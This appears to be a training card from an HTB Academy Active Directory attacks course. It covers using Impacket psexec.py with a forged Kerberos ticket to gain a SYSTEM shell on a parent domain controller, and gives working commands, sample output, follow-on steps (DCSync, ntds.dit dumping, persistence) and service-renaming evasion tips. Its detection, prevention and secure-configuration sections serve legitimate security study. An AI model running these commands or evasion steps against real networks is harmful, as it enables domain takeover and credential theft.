name: psexec.py - Shell via Kerberos Ticket
description: Authenticates to a remote host using a Kerberos ticket (KRB5CCNAME) and spawns a SYSTEM shell via psexec technique. -k uses the ccache, -no-pass skips password prompt. Used after ExtraSids golden ticket attack or NoPac to execute commands on the parent DC as SYSTEM. Requires the ccache to be exported in KRB5CCNAME.
source: CPTS Module 13: Active Directory Enumeration & Attacks
notes:
=== PSEXEC.PY vs OTHER IMPACKET EXEC TOOLS ===
  psexec.py   → installs a service (SVCManager), runs as SYSTEM, interactive shell
               Loud: creates Windows service (Event 7045), high OPSEC footprint
  wmiexec.py  → uses WMI, semi-interactive, runs as auth'd user (not SYSTEM by default)
               Quieter than psexec, still detectable
  smbexec.py  → uses scheduled task via SMB, runs as SYSTEM
               Similar footprint to psexec

For ExtraSids ticket use: psexec.py gives you SYSTEM on the target immediately.

=== REQUIRED SETUP ===
# Export the forged/obtained ccache
export KRB5CCNAME=Administrator.ccache

# Ensure DNS resolves the FQDN (add to /etc/hosts if needed):
echo '172.16.5.5 ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' >> /etc/hosts

# Then run psexec:
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/Administrator@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL \
  -k -no-pass -target-ip 172.16.5.5

=== WHY FQDN MATTERS FOR KERBEROS ===
Kerberos tickets are issued for a specific service principal (HOST/FQDN).
If you use an IP instead of FQDN, Kerberos can't match the ticket → falls back to NTLM.
Always use FQDN in the target argument, with -target-ip for routing.

=== WHAT YOU GET ===
  C:\Windows\system32> whoami
  nt authority\system
  C:\Windows\system32> hostname
  ACADEMY-EA-DC01
Full SYSTEM shell on the parent DC — DCSync, dump ntds.dit, or deploy persistence.

=== CHAIN POSITION ===
Comes after: ticketer.py ExtraSids (ad-ticketer-extrasids) or NoPac ccache
Leads to: secretsdump.py on parent DC, golden ticket for parent domain persistence

references.title: HTB Academy - Active Directory Enumeration & Attacks

recommended.note: Leverage trust data for cross-domain forging.

defense.why_it_works: psexec.py authenticates via SMB using the Kerberos ticket from KRB5CCNAME. It connects to the IPC$ share, uses the Service Control Manager (SVCMGR) to install a binary as a Windows service, executes it as SYSTEM, and provides an interactive shell. The DC (or target) trusts the Kerberos ticket presented — after ExtraSids golden ticket injection the ticket carries Enterprise Admin SIDs so the DC grants full access.
defense.prerequisites: Valid .ccache file (golden ticket, forged or stolen TGT) exported in KRB5CCNAME environment variable. Target FQDN resolvable (Kerberos requires FQDN — IP auth falls back to NTLM). Network reach to target on TCP 445. Target must accept the authenticated user for ADMIN$/IPC$ access.
defense.impact: SYSTEM shell on the target host — highest privilege on the local machine. On a DC this enables NTDS.dit dump, DCSync, registry key creation for persistence, and complete domain compromise.
defense.detection: Windows Security Event 7045 (service installation) on the target for a newly-created service (PSEXESVC or custom named). Event 4624 type 3 (network logon) on the target. Event 4672 (special logon with sensitive privileges). File creation in %SystemRoot% (PSEXESVC.exe). SMB connection on port 445 to ADMIN$/IPC$. EDR detects PSEXESVC service pattern and network-to-local-code-execution chain.
defense.artifacts: PSEXESVC service in Windows Service Manager (Event 7045); PSEXESVC.exe in C:\Windows\; Event 4624 type 3 on target; SMB session logs; network traffic on TCP 445 from attacker's Linux IP.
defense.prevention: Disable ADMIN$ and C$ administrative shares on workstations where not needed. Host-based firewall blocking inbound SMB (445) from untrusted source IPs. EDR rules blocking PSEXESVC service pattern. Least-privilege — limit which accounts have ADMIN$ access across hosts. Kerberos ticket lifetime enforcement (short-lived tickets reduce the window for forged ticket use).
defense.evasion: Use -service-name to rename the deployed service away from PSEXESVC. Use -remote-exe to supply a custom binary instead of the default PSEXESVC.exe. Alternatively use wmiexec.py or smbexec.py which have different (sometimes lower) footprint. Operate quickly — the ticket and service are short-lived indicators.
defense.misconfiguration: Domain trusts (especially bidirectional and forest trusts) extend authentication boundaries. SID filtering is often disabled on forest trusts to support legacy applications — but this allows an attacker with Domain Admin in a child domain to forge a golden ticket with ExtraSids claiming Domain Admin SID in the parent/trusted forest. Without SID filtering (SIDHistory filtering), domain boundaries offer no security isolation.
defense.vulnerable_config:
# Bidirectional forest trust without SID filtering:
Get-ADTrust -Filter * | Select-Object Name, Direction, SIDFilteringQuarantined
# SIDFilteringQuarantined: False  <-- SID filtering DISABLED
# Direction: BiDirectional        <-- both domains trust each other

# Child domain to parent: SID filtering is always disabled by default
# Enterprise Admin SID (S-1-5-21-<root>-519) can be added to ExtraSids
# Golden ticket with ExtraSids = cross-domain privilege escalation
defense.secure_config:
# Enable SID filtering on external/forest trusts:
netdom trust <TrustingDomain> /domain:<TrustedDomain> /quarantine:yes
# 'Quarantine' = SID filtering enabled — ExtraSids from other domain are stripped

# For child-to-parent trusts (SID filtering can't be enabled without breaking functionality):
# Use Selective Authentication instead of full trust
# Only accounts explicitly granted 'Allowed to Authenticate' can use the trust
netdom trust <ParentDomain> /domain:<ChildDomain> /SelectiveAuth:yes

# Restrict SIDHistory (prevents ExtraSids abuse):
# Audit accounts with SIDHistory:
Get-ADUser -Filter {SIDHistory -like '*'} -Properties SIDHistory

# Monitor cross-forest authentication:
# Event 4769 on parent DC with ticket from child domain user
